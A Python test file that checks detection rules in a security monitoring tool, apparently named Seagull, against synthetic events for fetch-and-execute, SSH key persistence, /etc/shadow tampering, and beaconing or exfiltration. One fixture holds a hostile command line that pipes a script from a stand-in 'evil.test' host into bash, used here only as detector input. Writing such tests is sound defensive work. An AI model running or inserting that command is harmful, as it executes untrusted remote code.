from __future__ import annotations

import os
from datetime import datetime, timezone
from pathlib import Path

os.environ.setdefault("SEAGULL_SKIP_STARTUP_BOOTSTRAP", "true")
os.environ.setdefault("SEAGULL_JWT_SECRET", "x" * 40)

from tests.detection_rule_harness import evaluate_rule, load_rule_index

_RULES_DIR = Path(__file__).resolve().parents[2] / "rules"


def _base_event(event_type: str, extra: dict) -> dict:
    return {
        "agent_id": "agent-host-1",
        "event_type": event_type,
        "timestamp": datetime.now(timezone.utc),
        "src_ip": "10.1.0.5",
        "dst_ip": "198.51.100.10",
        "src_port": 54123,
        "dst_port": 443,
        "proto": "tcp",
        "bytes": 2048,
        "extra": extra,
    }


def test_proc_remote_fetch_exec_rule_triggers() -> None:
    rules = load_rule_index(str(_RULES_DIR))
    rule = rules["proc_remote_fetch_exec_v1"]
    ev = _base_event(
        "proc_exec",
        {
            "exec_pattern": "remote_fetch_exec",
            "exec_patterns": ["remote_fetch_exec", "interpreter"],
            "cmdline": "curl -fsSL https://evil.test/bootstrap.sh | bash",
        },
    )
    hits = evaluate_rule(rule, [ev], datetime.now(timezone.utc))
    assert len(hits) == 1


def test_persistence_and_fim_rules_trigger() -> None:
    rules = load_rule_index(str(_RULES_DIR))
    now = datetime.now(timezone.utc)

    ssh_rule = rules["persistence_authorized_keys_change_v1"]
    ssh_ev = _base_event(
        "ssh_key_change",
        {
            "action": "modify",
            "path": "/root/.ssh/authorized_keys",
            "path_category": "ssh_authorized_keys",
            "persistence_related": True,
        },
    )
    assert len(evaluate_rule(ssh_rule, [ssh_ev], now)) == 1

    fim_rule = rules["fim_security_tamper_v1"]
    fim_ev = _base_event(
        "fim_change",
        {
            "action": "modify",
            "path": "/etc/shadow",
            "path_category": "security_file",
            "tamper_related": True,
        },
    )
    assert len(evaluate_rule(fim_rule, [fim_ev], now)) == 1


def test_beacon_and_exfil_heuristic_rules_confidence_gate() -> None:
    rules = load_rule_index(str(_RULES_DIR))
    now = datetime.now(timezone.utc)

    beacon_rule = rules["beacon_suspect_heuristic_v1"]
    exfil_rule = rules["exfil_suspect_heuristic_v1"]

    beacon_low = _base_event("beacon_suspect", {"confidence": 50, "heuristic_name": "beacon_periodic_outbound"})
    beacon_high = _base_event("beacon_suspect", {"confidence": 78, "heuristic_name": "beacon_periodic_outbound"})
    assert evaluate_rule(beacon_rule, [beacon_low], now) == []
    assert len(evaluate_rule(beacon_rule, [beacon_high], now)) == 1

    exfil_high = _base_event("exfil_suspect", {"confidence": 88, "heuristic_name": "exfil_burst_rare_destination"})
    assert len(evaluate_rule(exfil_rule, [exfil_high], now)) == 1
